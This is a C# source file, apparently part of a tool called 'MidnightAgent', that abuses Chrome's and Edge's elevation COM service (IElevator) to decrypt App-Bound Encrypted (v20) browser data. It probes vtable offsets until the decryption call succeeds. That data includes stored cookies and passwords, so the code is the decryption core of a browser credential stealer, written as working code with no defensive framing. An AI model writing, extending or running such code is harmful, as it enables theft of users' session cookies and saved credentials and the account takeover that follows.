using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace MidnightAgent.Utils
{
    /// <summary>
    /// Handles Chrome App-Bound Encryption (v20) decryption via IElevator COM interface
    /// </summary>
    public static class ChromeElevator
    {
        // Chrome Elevation Service CLSID
        private static readonly Guid CLSID_ChromeElevation = new Guid("708860E0-F641-4611-8895-7D867DD3675B");
        
        // Edge Elevation Service CLSID  
        private static readonly Guid CLSID_EdgeElevation = new Guid("1FCBE96C-1697-43AF-9140-2897C7C69767");
        
        // IElevator Interface IID
        private static readonly Guid IID_IElevator = new Guid("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C");

        [DllImport("ole32.dll")]
        private static extern int CoInitializeEx(IntPtr pvReserved, uint dwCoInit);

        [DllImport("ole32.dll")]
        private static extern int CoCreateInstance(
            [In] ref Guid rclsid,
            IntPtr pUnkOuter,
            uint dwClsContext,
            [In] ref Guid riid,
            out IntPtr ppv);

        [DllImport("ole32.dll")]
        private static extern void CoUninitialize();

        private const uint COINIT_MULTITHREADED = 0x0;
        private const uint CLSCTX_LOCAL_SERVER = 0x4;

        // IElevator interface vtable offsets (QueryInterface=0, AddRef=1, Release=2, then custom methods)
        // DecryptData is typically at offset 3 or 4
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int DecryptDataDelegate(
            IntPtr pThis,
            [MarshalAs(UnmanagedType.LPWStr)] string ciphertext,
            out IntPtr plaintext,
            out uint lastError);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int ReleaseDelegate(IntPtr pThis);

        /// <summary>
        /// Attempts to decrypt v20 App-Bound encrypted data using Chrome's IElevator service
        /// </summary>
        public static byte[] DecryptAppBound(byte[] encryptedData, out string error)
        {
            error = null;
            IntPtr pElevator = IntPtr.Zero;
            
            try
            {
                // Initialize COM
                int hr = CoInitializeEx(IntPtr.Zero, COINIT_MULTITHREADED);
                // S_OK or S_FALSE (already initialized) are both acceptable
                if (hr < 0 && hr != -2147417850) // RPC_E_CHANGED_MODE
                {
                    error = $"CoInitializeEx failed: 0x{hr:X}";
                    return null;
                }

                // Try Chrome first, then Edge
                Guid clsid = CLSID_ChromeElevation;
                Guid iid = IID_IElevator;
                
                hr = CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_LOCAL_SERVER, ref iid, out pElevator);
                
                if (hr != 0)
                {
                    // Try Edge
                    clsid = CLSID_EdgeElevation;
                    hr = CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_LOCAL_SERVER, ref iid, out pElevator);
                    
                    if (hr != 0)
                    {
                        error = $"CoCreateInstance failed for both Chrome and Edge: 0x{hr:X}. This may require running from Chrome's directory or admin privileges.";
                        return null;
                    }
                }

                if (pElevator == IntPtr.Zero)
                {
                    error = "IElevator interface is null";
                    return null;
                }

                // Get vtable
                IntPtr vtable = Marshal.ReadIntPtr(pElevator);
                
                // DecryptData is typically at vtable offset 6 (after QI, AddRef, Release, and 3 other methods)
                // But this varies - we need to find the correct offset
                // Common offsets to try: 3, 4, 5, 6
                
                // Convert encrypted bytes to Base64 string (IElevator expects string input)
                string encryptedB64 = Convert.ToBase64String(encryptedData);
                
                // Try different vtable offsets for DecryptData
                int[] offsets = { 3, 4, 5, 6, 7, 8 };
                
                foreach (int offset in offsets)
                {
                    try
                    {
                        IntPtr decryptPtr = Marshal.ReadIntPtr(vtable, offset * IntPtr.Size);
                        var decryptFunc = Marshal.GetDelegateForFunctionPointer<DecryptDataDelegate>(decryptPtr);
                        
                        IntPtr plaintextPtr;
                        uint lastError;
                        
                        hr = decryptFunc(pElevator, encryptedB64, out plaintextPtr, out lastError);
                        
                        if (hr == 0 && plaintextPtr != IntPtr.Zero)
                        {
                            string plaintext = Marshal.PtrToStringUni(plaintextPtr);
                            Marshal.FreeCoTaskMem(plaintextPtr);
                            return Convert.FromBase64String(plaintext);
                        }
                    }
                    catch
                    {
                        // Try next offset
                        continue;
                    }
                }
                
                error = "DecryptData call failed - could not find working vtable offset or decryption failed";
                return null;
            }
            catch (Exception ex)
            {
                error = $"Exception: {ex.Message}";
                return null;
            }
            finally
            {
                if (pElevator != IntPtr.Zero)
                {
                    try
                    {
                        IntPtr vtable = Marshal.ReadIntPtr(pElevator);
                        IntPtr releasePtr = Marshal.ReadIntPtr(vtable, 2 * IntPtr.Size); // Release is always at offset 2
                        var releaseFunc = Marshal.GetDelegateForFunctionPointer<ReleaseDelegate>(releasePtr);
                        releaseFunc(pElevator);
                    }
                    catch { }
                }
                
                try { CoUninitialize(); } catch { }
            }
        }

        /// <summary>
        /// Checks if the elevation service is available
        /// </summary>
        public static bool IsElevatorAvailable()
        {
            try
            {
                int hr = CoInitializeEx(IntPtr.Zero, COINIT_MULTITHREADED);
                
                Guid clsid = CLSID_ChromeElevation;
                Guid iid = IID_IElevator;
                IntPtr pElevator;
                
                hr = CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_LOCAL_SERVER, ref iid, out pElevator);
                
                if (hr == 0 && pElevator != IntPtr.Zero)
                {
                    // Release
                    IntPtr vtable = Marshal.ReadIntPtr(pElevator);
                    IntPtr releasePtr = Marshal.ReadIntPtr(vtable, 2 * IntPtr.Size);
                    var releaseFunc = Marshal.GetDelegateForFunctionPointer<ReleaseDelegate>(releasePtr);
                    releaseFunc(pElevator);
                    
                    CoUninitialize();
                    return true;
                }
                
                CoUninitialize();
                return false;
            }
            catch
            {
                return false;
            }
        }
    }
}
